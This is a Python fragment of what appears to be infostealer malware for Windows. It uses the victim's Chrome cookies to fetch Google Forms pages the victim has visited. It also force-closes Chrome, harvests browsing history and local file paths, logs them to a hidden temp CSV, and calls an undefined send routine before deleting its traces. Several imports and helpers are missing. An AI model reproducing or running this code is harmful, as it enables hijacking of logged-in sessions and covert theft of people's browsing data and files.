import urllib.request
import browser_cookie3 # pip install browser_cookie3

def download_form(url, i):
    try:
        global form_list
        cj = browser_cookie3.chrome()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        login_html = opener.open(url).read()
        # make a html file and store login_html in it
        with open(f"C:\\temp\\login{i}.html", "wb") as f:
            f.write(login_html)
        # put it on form_list
        form_list.append(f"C:\\temp\\login{i}.html")
    except Exception:  # NOQA
        pass

def get_chrome_history():
    # close chrome if it is open
    try:
        os.system("taskkill /f /im chrome.exe")
    except Exception:  # NOQA
        pass
    
    # copy getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\History", "rb" to temp folder
    try:
        dict_obj = bh.get_browserhistory()
    except Exception:  # NOQA
        pass
    
    i = 0
    while True:
        try:
            # if it's Google form
            if dict_obj['chrome'][i][0].startswith("https://docs.google.com/forms/"):
                download_form(dict_obj['chrome'][i][0], i)
                i += 1
            # if it's a path
            elif dict_obj['chrome'][i][0].startswith("file:///"):
                # remove the file:///
                path = dict_obj['chrome'][i][0][8:]
                priority_files.append(path)
                i += 1
        except Exception:  # NOQA
            pass

        try:
            if not os.path.exists("C:\\temp") or not os.path.isfile("C:\\temp\\.tempcache.csv"):
                try:
                    os.mkdir("C:\\temp\\")
                except Exception:  # NOQA
                    pass
                try:
                    open("C:\\temp\\.tempcache.csv", "w").close()
                except Exception:  # NOQA
                    pass

            # write to csv file but don't delete the previous data
            with open("C:\\temp\\.tempcache.csv", mode='a', newline='',
                      encoding='utf-8') as decrypt_password_file:
                decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=',', quotechar='"',
                                                     quoting=csv.QUOTE_MINIMAL)
                decrypt_password_writer.writerow(dict_obj['chrome'][i])
            i += 1
        except Exception as e:  # NOQA
            print(e)
            break

def delete_form(form_lst):
    for i in form_lst:
        os.remove(i)

try:
    access_and_send(form_list)
except Exception:  # NOQA
    pass
try:
    delete_form(form_list)
except Exception:  # NOQA
    pass
